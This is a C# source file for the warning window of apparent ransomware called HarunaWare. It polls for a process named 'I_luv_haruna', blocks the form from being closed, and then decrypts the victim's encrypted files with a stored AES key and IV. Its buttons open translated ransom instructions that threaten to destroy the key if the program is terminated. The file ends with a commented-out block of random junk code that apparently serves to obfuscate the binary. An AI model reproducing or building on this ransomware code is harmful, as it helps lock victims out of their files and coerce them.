using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using HarunaWare.Properties;

namespace HarunaWare
{
    
	public partial class frmWarning : Form
	{
		private bool _flag;
        string picurl = "https://s4.ax1x.com/2022/02/26/bepdC6.jpg";

        public bool thProcessflag
		{
			get { return this._flag; }
			
			set
			{
				this._flag = value;
				if (this._flag)
				{
					this.ProcStatus.Invoke(new MethodInvoker(delegate()
					{
						this.ProcStatus.Text = "Detected";
					}));
					return;
				}

				this.ProcStatus.Invoke(new MethodInvoker(delegate()
				{
					this.ProcStatus.Text = "Process Killed!";
				}));
			}
		}

		public frmWarning()
		{
			this.InitializeComponent();
			new Thread(delegate()
			{
				for (;;)
				{
                    
                    if (!this.thProcessflag)
					{
						Process[] processesByName = Process.GetProcessesByName("I_luv_haruna");
						if (processesByName.Length != 0)
						{
							
							
							this.thProcessflag = true;
							break;
						}
					}

					Thread.Sleep(100);
				}

				// Write the AES key and IV to their respective files
				File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
				File.WriteAllBytes(Program.IVFilePath,  Program.randomIV);
				
				this.decryptProgress.Maximum = Program.encryptedFiles.Count;
				using (List<string>.Enumerator enumerator = Program.encryptedFiles.GetEnumerator()) // Go through each of the encrypted files
				{
					while (enumerator.MoveNext())
					{
						string fileName = enumerator.Current;
						try
						{
							this.DecryptStatus.Invoke(new MethodInvoker(delegate()
							{
								this.DecryptStatus.Text = Path.GetFileName(fileName);
							}));

							Program.Crypt(fileName, true); // Decrypt the file
							
							ProgressBar progressBar = this.decryptProgress;
							progressBar.Value = progressBar.Value + 1;
							Thread.Sleep(100);
						}
						catch
						{
						}
					}
				}

				base.Invoke(new MethodInvoker(delegate()
				{
					MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
					this.ButtonManualDecrypt.Visible = true;
					this.ButtonExit.Visible = true;
				}));
			}).Start();
		}
        public void OpenWebLink(string url)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            catch (Exception e)
            {
                //Some exception handling code
                // ...
            }

        }
        private void Prevent(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		private void ButtonExit_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		private void ButtonManualDecrypt_Click(object sender, EventArgs e)
		{
			new frmManualDecrypter().ShowDialog(this);
		}

        private void MessageHeader_Click(object sender, EventArgs e)
        {
            this.pictureBox1.LoadAsync(picurl);
        }

        private void buttonENG_Click(object sender, EventArgs e)
        {
            this.pictureBox1.LoadAsync(picurl);
            OpenWebLink("https://translate.google.com/?hl=en-US&sl=auto&tl=ru&text=That%27s%20easy.%20You%20just%20have%20to%20made%20an%20helloworld(no%20matter%20in%20what%20language)%20named%20%22I_luv_haruna.exe%22%20%2Cand%20then%20show%20your%20love%20to%20Haruna.%20This%20application%20will%20detect%20your%20love%20automatically.%20DO%20NOT%20TRY%20USING%20FAKE%20EXE%20OR%20TEMRMINATE%20THIS%20APPLICATION%20IF%20YOU%20DON%27T%20WANT%20TO%20BLOW%20UP%20THE%20%20LOVE%20STORY%20KEY!&op=translate");
        }
        
        private void buttonCN_Click(object sender, EventArgs e)
        {
            this.pictureBox1.LoadAsync(picurl);
            OpenWebLink("https://translate.google.cn/?hl=en-US&sl=auto&tl=zh-TW&text=That%27s%20easy.%20You%20just%20have%20to%20made%20an%20helloworld(no%20matter%20in%20what%20language)%20named%20%22I_luv_haruna.exe%22%20%2Cand%20then%20show%20your%20love%20to%20Haruna.%20This%20application%20will%20detect%20your%20love%20automatically.%20DO%20NOT%20TRY%20USING%20FAKE%20EXE%20OR%20TEMRMINATE%20THIS%20APPLICATION%20IF%20YOU%20DON%27T%20WANT%20TO%20BLOW%20UP%20THE%20%20LOVE%20STORY%20KEY!&op=translate");
        }

        private void frmWarning_Load(object sender, EventArgs e)
        {
            this.pictureBox1.LoadAsync(picurl);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            this.pictureBox1.LoadAsync(picurl);
        }
    }
}
/*
namespace Functions
{
    class hAUrNlAaXZS91C32ISFMM
    {
        void Z7BASNXR3E72()
        {
            int DLSD1GWGWH0FA = 251367103;
            if (DLSD1GWGWH0FA > 251367129)
                DLSD1GWGWH0FA = 251367103;
            else if (DLSD1GWGWH0FA <= 251367136)
                DLSD1GWGWH0FA++;
            else
                DLSD1GWGWH0FA = (251367135 / 251367167);
            int DLGA63BZ1YSA7 = 251367123;
            if (DLGA63BZ1YSA7 > 251367105)
                DLGA63BZ1YSA7 = 251367173;
            else if (DLGA63BZ1YSA7 <= 251367145)
                DLGA63BZ1YSA7++;
            else
                DLGA63BZ1YSA7 = (251367153 / 251367105);
            int DQLK1PRQWGMQN = 251367176;
            if (DQLK1PRQWGMQN > 251367126)
                DQLK1PRQWGMQN = 251367174;
            else if (DQLK1PRQWGMQN <= 251367108)
                DQLK1PRQWGMQN++;
            else
                DQLK1PRQWGMQN = (251367157 / 251367156);
            int DYIRJ686MXD3D = 251367139;
            if (DYIRJ686MXD3D > 251367188)
                DYIRJ686MXD3D = 251367162;
            else if (DYIRJ686MXD3D <= 251367164)
                DYIRJ686MXD3D++;
            else
                DYIRJ686MXD3D = (251367136 / 251367159);
            bool DYD2ZEK972N0C = false;
            if (!DYD2ZEK972N0C)
                DYD2ZEK972N0C = true;
            else if (DYD2ZEK972N0C = false)
                DYD2ZEK972N0C = false;
            else
                DYD2ZEK972N0C = false;
            int DZP9Q55IKHD1G = 251367153;
            if (DZP9Q55IKHD1G > 251367132)
                DZP9Q55IKHD1G = 251367161;
            else if (DZP9Q55IKHD1G <= 251367171)
                DZP9Q55IKHD1G++;
            else
                DZP9Q55IKHD1G = (251367107 / 251367152);
            int DP83K2SY467AY = 251367176;
            if (DP83K2SY467AY > 251367183)
                DP83K2SY467AY = 251367126;
            else if (DP83K2SY467AY <= 251367195)
                DP83K2SY467AY++;
            else
                DP83K2SY467AY = (251367188 / 251367151);
            int D872R2P9J26F0 = 251367113;
            if (D872R2P9J26F0 > 251367127)
                D872R2P9J26F0 = 251367190;
            else if (D872R2P9J26F0 <= 251367167)
                D872R2P9J26F0++;
            else
                D872R2P9J26F0 = (251367121 / 251367159);
            bool DMQFB0SBSS1JG = true;
            if (!DMQFB0SBSS1JG)
                DMQFB0SBSS1JG = false;
            else if (DMQFB0SBSS1JG = false)
                DMQFB0SBSS1JG = true;
            else
                DMQFB0SBSS1JG = true;
            int DFEQI5N1IO4OS = 251367101;
            if (DFEQI5N1IO4OS > 251367116)
                DFEQI5N1IO4OS = 251367138;
            else if (DFEQI5N1IO4OS <= 251367103)
                DFEQI5N1IO4OS++;
            else
                DFEQI5N1IO4OS = (251367114 / 251367151);
            bool DRX5R67JSDLW2 = true;
            if (!DRX5R67JSDLW2)
                DRX5R67JSDLW2 = true;
            else if (DRX5R67JSDLW2 = true)
                DRX5R67JSDLW2 = true;
            else
                DRX5R67JSDLW2 = true;
            int DH6BJF2CMDAAD = 251367184;
            if (DH6BJF2CMDAAD > 251367173)
                DH6BJF2CMDAAD = 251367169;
            else if (DH6BJF2CMDAAD <= 251367120)
                DH6BJF2CMDAAD++;
            else
                DH6BJF2CMDAAD = (251367104 / 251367165);
            int D46Q12F16LWWD = 251367140;
            if (D46Q12F16LWWD > 251367179)
                D46Q12F16LWWD = 251367101;
            else if (D46Q12F16LWWD <= 251367171)
                D46Q12F16LWWD++;
            else
                D46Q12F16LWWD = (251367176 / 251367147);
            int D795OKIB6949Y = 251367146;
            if (D795OKIB6949Y > 251367132)
                D795OKIB6949Y = 251367139;
            else if (D795OKIB6949Y <= 251367115)
                D795OKIB6949Y++;
            else
                D795OKIB6949Y = (251367181 / 251367113);
            bool DKMKIQ5QAHCPJ = false;
            if (!DKMKIQ5QAHCPJ)
                DKMKIQ5QAHCPJ = false;
            else if (DKMKIQ5QAHCPJ = true)
                DKMKIQ5QAHCPJ = true;
            else
                DKMKIQ5QAHCPJ = false;
            bool DOSOBSA4YBMDE = false;
            if (!DOSOBSA4YBMDE)
                DOSOBSA4YBMDE = true;
            else if (DOSOBSA4YBMDE = true)
                DOSOBSA4YBMDE = true;
            else
                DOSOBSA4YBMDE = true;
            bool D28CZ5OZIOOF5 = false;
            if (!D28CZ5OZIOOF5)
                D28CZ5OZIOOF5 = true;
            else if (D28CZ5OZIOOF5 = true)
                D28CZ5OZIOOF5 = true;
            else
                D28CZ5OZIOOF5 = false;
            bool DNDN1A4SHH5LB = true;
            if (!DNDN1A4SHH5LB)
                DNDN1A4SHH5LB = true;
            else if (DNDN1A4SHH5LB = true)
                DNDN1A4SHH5LB = true;
            else
                DNDN1A4SHH5LB = true;
            int DPAC63NGZ4NJN = 251367146;
            if (DPAC63NGZ4NJN > 251367135)
                DPAC63NGZ4NJN = 251367183;
            else if (DPAC63NGZ4NJN <= 251367121)
                DPAC63NGZ4NJN++;
            else
                DPAC63NGZ4NJN = (251367181 / 251367152);
            int D9IDY14I6DDOK = 251367133;
            if (D9IDY14I6DDOK > 251367119)
                D9IDY14I6DDOK = 251367167;
            else if (D9IDY14I6DDOK <= 251367192)
                D9IDY14I6DDOK++;
            else
                D9IDY14I6DDOK = (251367155 / 251367123);
            int DEK13XSCB7BJ3 = 251367149;
            if (DEK13XSCB7BJ3 > 251367118)
                DEK13XSCB7BJ3 = 251367168;
            else if (DEK13XSCB7BJ3 <= 251367189)
                DEK13XSCB7BJ3++;
            else
                DEK13XSCB7BJ3 = (251367160 / 251367115);
            int DQQ89QDII5KB1 = 251367105;
            if (DQQ89QDII5KB1 > 251367190)
                DQQ89QDII5KB1 = 251367176;
            else if (DQQ89QDII5KB1 <= 251367189)
                DQQ89QDII5KB1++;
            else
                DQQ89QDII5KB1 = (251367134 / 251367188);
            bool D5AS4KXY2Y4A1 = false;
            if (!D5AS4KXY2Y4A1)
                D5AS4KXY2Y4A1 = true;
            else if (D5AS4KXY2Y4A1 = true)
                D5AS4KXY2Y4A1 = false;
            else
                D5AS4KXY2Y4A1 = true;
            int DIEZZSMXW9AMS = 251367176;
            if (DIEZZSMXW9AMS > 251367191)
                DIEZZSMXW9AMS = 251367182;
            else if (DIEZZSMXW9AMS <= 251367146)
                DIEZZSMXW9AMS++;
            else
                DIEZZSMXW9AMS = (251367159 / 251367109);
            bool DJC02ONML37MO = false;
            if (!DJC02ONML37MO)
                DJC02ONML37MO = false;
            else if (DJC02ONML37MO = true)
                DJC02ONML37MO = true;
            else
                DJC02ONML37MO = true;
            bool DIOCW3ZBQAMSQ = true;
            if (!DIOCW3ZBQAMSQ)
                DIOCW3ZBQAMSQ = true;
            else if (DIOCW3ZBQAMSQ = true)
                DIOCW3ZBQAMSQ = false;
            else
                DIOCW3ZBQAMSQ = true;
            int DFH76A7YIE82F = 251367117;
            if (DFH76A7YIE82F > 251367160)
                DFH76A7YIE82F = 251367136;
            else if (DFH76A7YIE82F <= 251367154)
                DFH76A7YIE82F++;
            else
                DFH76A7YIE82F = (251367130 / 251367144);
            int D7QWOKLYH2BOQ = 251367147;
            if (D7QWOKLYH2BOQ > 251367120)
                D7QWOKLYH2BOQ = 251367117;
            else if (D7QWOKLYH2BOQ <= 251367108)
                D7QWOKLYH2BOQ++;
            else
                D7QWOKLYH2BOQ = (251367182 / 251367136);
            bool D6680IFJC3E4Z = true;
            if (!D6680IFJC3E4Z)
                D6680IFJC3E4Z = false;
            else if (D6680IFJC3E4Z = false)
                D6680IFJC3E4Z = true;
            else
                D6680IFJC3E4Z = false;
            int DDCHJRZEPDKEJ = 251367143;
            if (DDCHJRZEPDKEJ > 251367126)
                DDCHJRZEPDKEJ = 251367152;
            else if (DDCHJRZEPDKEJ <= 251367175)
                DDCHJRZEPDKEJ++;
            else
                DDCHJRZEPDKEJ = (251367144 / 251367166);
            bool DSBCYHPQX690D = true;
            if (!DSBCYHPQX690D)
                DSBCYHPQX690D = false;
            else if (DSBCYHPQX690D = true)
                DSBCYHPQX690D = false;
            else
                DSBCYHPQX690D = true;
            bool DBK36O48ADWXY = true;
            if (!DBK36O48ADWXY)
                DBK36O48ADWXY = true;
            else if (DBK36O48ADWXY = true)
                DBK36O48ADWXY = false;
            else
                DBK36O48ADWXY = false;
        }
    }
}*/